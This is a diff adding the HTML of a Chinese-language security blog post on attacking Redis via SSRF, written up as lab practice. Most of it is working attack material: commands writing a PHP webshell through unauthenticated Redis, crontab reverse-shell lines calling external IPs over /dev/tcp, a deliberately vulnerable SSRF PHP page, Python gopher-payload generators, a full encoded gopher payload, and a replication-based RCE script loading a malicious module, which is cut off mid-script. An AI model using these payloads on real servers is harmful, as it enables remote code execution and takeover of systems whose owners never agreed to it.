@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="ssrf到redis"/>
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/05/21/ssrf到redis/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf到redis">
+<meta property="og:url" content="https://glotozz.github.io/2020/05/21/ssrf%E5%88%B0redis/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/yJisMYHdgcT8wG4.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/MbfJawV6Fhn7dpe.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/7HyuCE8cwNFb2fe.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/iQDBXu3EabyIv91.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/a1ivgdJEblI8zCY.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/uDXOSTJsl7IGF2Y.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/RALKbh12qZY8FU6.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/hUpLHCTd3GYD6Ko.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/SgFMkuBlZ986Nht.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/GjyX7SU1QdpHA3I.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/7ZzmLU6DYhCMoGF.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/u9Cir6MnHqeAchv.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/22/BSt9OxPVIdlhRJA.png">
+<meta property="article:published_time" content="2020-05-21T11:44:13.000Z">
+<meta property="article:modified_time" content="2020-05-22T07:39:16.096Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/22/yJisMYHdgcT8wG4.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> ssrf到redis - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
+</head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          ssrf到redis
+        
+      </h1>
+
+      <time class="post-time">
+          May 21 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#一-安装redis">一、安装redis</a></li>
+<li><a href="#二-启动redis">二、启动redis</a></li>
+<li><a href="#三-未授权访问">三、未授权访问</a></li>
+<li><a href="#四-弱口令">四、弱口令</a></li>
+<li><a href="#五-限制访问ip">五、限制访问ip</a></li>
+<li><a href="#六-基于主从复制的redis4x5x-rce">六、 基于主从复制的redis4.x/5.x rce</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h3><span id="一-安装redis">一、安装redis</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">cd src</span><br><span class="line">cp redis-cli &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="二-启动redis">二、启动redis</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>这个配置里面可以禁用一些高危命令、为redis添加密码认证、修改默认端口等。</p>
+<h3><span id="三-未授权访问">三、未授权访问</span></h3><p>使用默认配置启动存在未授权访问</p>
+<p><img src="https://i.loli.net/2020/05/22/yJisMYHdgcT8wG4.png" alt="Snipaste_2020-05-22_08-19-53.png"></p>
+<p><strong>redis写shell</strong></p>
+<p>需要web目录具有写权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/22/MbfJawV6Fhn7dpe.png" alt="Snipaste_2020-05-22_08-22-46.png"></p>
+<p>类似的还有，</p>
+<p><strong>利用公私钥认证获取root权限</strong></p>
+<p><strong>利用crontab反弹shell</strong></p>
+<h3><span id="四-弱口令">四、弱口令</span></h3><p>在<code>redis.conf</code>中配置<code>requirepass password</code></p>
+<p><img src="https://i.loli.net/2020/05/22/7HyuCE8cwNFb2fe.png" alt="Snipaste_2020-05-22_08-30-39.png"></p>
+<h3><span id="五-限制访问ip">五、限制访问ip</span></h3><p>在<code>redis.conf</code>中配置<code>bind 127.0.0.1</code></p>
+<p><img src="https://i.loli.net/2020/05/22/iQDBXu3EabyIv91.png" alt="Snipaste_2020-05-22_08-36-16.png"></p>
+<p>准备一个<code>ssrf.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123; </span><br><span class="line">        $link = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">        $curlobj = curl_init(); </span><br><span class="line">        curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">        curl_setopt($curlobj,CURLOPT_URL,$link); </span><br><span class="line">        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $result=curl_exec($curlobj); </span><br><span class="line">        curl_close($curlobj); </span><br><span class="line">         </span><br><span class="line">        $filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>; </span><br><span class="line">        file_put_contents($filename, $result);  </span><br><span class="line">        <span class="keyword">echo</span> $result; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>安装curl扩展</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.3-curl</span><br></pre></td></tr></table></figure>
+
+<p>利用gopher协议ssrf访问redis</p>
+<p>首先得抓取流量才能构造payload，先把ip访问限制和密码关闭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.126&#x2F;2333 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>
+
+<p>端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.56.124:637</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/22/a1ivgdJEblI8zCY.png" alt="Snipaste_2020-05-22_09-45-44.png"></p>
+<p><img src="https://i.loli.net/2020/05/22/uDXOSTJsl7IGF2Y.png" alt="Snipaste_2020-05-22_10-22-15.png"></p>
+<p>成功写入，但是没反弹到shell。。因为写错目录了</p>
+<blockquote>
+<p>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code> </p>
+<p>均存在的<code>/etc/crontab</code>都需要root权限，高版本的redis默认是redis权限启动</p>
+</blockquote>
+<p>注意两点</p>
+<ul>
+<li><p>注意看一下生成的<code>root</code>文件,可能结构较乱无法识别，可以多加几个换行。 </p>
+</li>
+<li><p>默认redis写文件后是644的权限，而ubuntu写<code>/var/spool/cron/crontabs/root</code>，需要600才能执行</p>
+</li>
+</ul>
+<p>解决上面两个问题后还是不行，<a href="https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/" target="_blank" rel="noopener">解决办法</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * *  bash -c &quot;bash -i  &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.126&#x2F;1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>测试在<code>/var/spool/cron/crontabs/root</code>下且权限为<code>600</code>时成功，总之kali和ubuntu无法成功，centos能测试成功。</p>
+<p>流量转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/22/RALKbh12qZY8FU6.png" alt="Snipaste_2020-05-22_09-54-23.png"></p>
+<ul>
+<li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li>
+<li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li>
+<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
+<li>空白行替换为<code>%0a</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.126&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>因为修改了反弹shell的ip和端口，还得修改对应的长度<code>$58</code>，原来的例子是<code>127.0.0.1/2333</code>，现在相应的变为<code>$63</code></p>
+<p>前面增加<code>gopher://192.168.56.124:6379/_</code></p>
+<p><img src="https://i.loli.net/2020/05/22/hUpLHCTd3GYD6Ko.png" alt="Snipaste_2020-05-22_11-29-19.png"></p>
+<p>成功写入</p>
+<h3><span id="六-基于主从复制的redis4x5x-rce">六、 基于主从复制的redis4.x/5.x rce</span></h3><p>顺便把环境换到<code>centos+ redis 4.0</code></p>
+<p><code>4.0版本</code>默认<code>bind 127.0.0.1</code></p>
+<blockquote>
+<p>wget <a href="http://download.redis.io/releases/redis-4.0.0.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-4.0.0.tar.gz</a></p>
+</blockquote>
+<p>先实现下刚刚没成功的定时任务弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;\n\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.78.1.204&#x2F;1234 0&gt;&amp;1\n\n\n\n&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>直接协议转化的脚本（比上面监听再转换方便些）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">port=<span class="string">"1235"</span></span><br><span class="line">reverse_ip=<span class="string">"117.78.1.204"</span></span><br><span class="line">reverse_port=<span class="string">"1234"</span></span><br><span class="line">cron=<span class="string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">"root"</span></span><br><span class="line">path=<span class="string">"/var/spool/cron"</span></span><br><span class="line">passwd=<span class="string">"password"</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(cron.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;118.178.88.46:1235&#x2F;_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%248%0D%0Apassword%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2462%0D%0A%0A%0A%0A%0A%2A&#x2F;1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.78.1.204&#x2F;1234%200%3E%261%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A&#x2F;var&#x2F;spool&#x2F;cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/22/SgFMkuBlZ986Nht.png" alt="Snipaste_2020-05-22_14-33-59.png"></p>
+<p><img src="https://i.loli.net/2020/05/22/GjyX7SU1QdpHA3I.png" alt="Snipaste_2020-05-22_14-33-17.png"></p>
+<p>成功反弹shell</p>
+<p><strong>主从复制</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试demo</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf </span><br><span class="line">redis-server &#x2F;etc&#x2F;redis&#x2F;redis1236.conf</span><br></pre></td></tr></table></figure>
+
+<p>建立主从</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 1235</span><br><span class="line">SLAVEOF 127.0.0.1 1236</span><br><span class="line">get test</span><br></pre></td></tr></table></figure>
+
+<p>这里如果主库有密码，需要在配置文件中设置<code>masterauth password</code>，当然攻击的时候我们没必要给主库设置密码，取消主从<code>SLAVEOF NO ONE</code></p>
+<p><img src="https://i.loli.net/2020/05/22/7ZzmLU6DYhCMoGF.png" alt="Snipaste_2020-05-22_14-57-27.png"></p>
+<hr>
+<p><strong>redis module</strong></p>
+<p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。 </p>
+<p><strong>利用原理</strong></p>
+<p><img src="https://i.loli.net/2020/05/22/u9Cir6MnHqeAchv.png" alt="Snipaste_2020-05-22_15-08-25.png"></p>
+<p>链接讲的比较详细， 一句话概括就是利用全量复制将master上的<code>RDB</code>文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF ip port</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">payload=open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename=<span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CRLF</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    redis_arr=arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(rhost,rport)</span>:</span></span><br><span class="line">    sock=socket.socket()</span><br><span class="line">    sock.connect((rhost,rport))</span><br><span class="line">    <span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">    sock.send(redis_format(cmd))</span><br><span class="line">    print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> flag:</span><br><span class="line">            shell=raw_input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">            shell=shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)</span><br><span class="line">            <span class="keyword">if</span> shell==<span class="string">"exit"</span> <span class="keyword">or</span> shell==<span class="string">"quit"</span>:</span><br><span class="line">                flag=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                send(sock,<span class="string">"system.exec &#123;&#125;"</span>.format(shell))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span 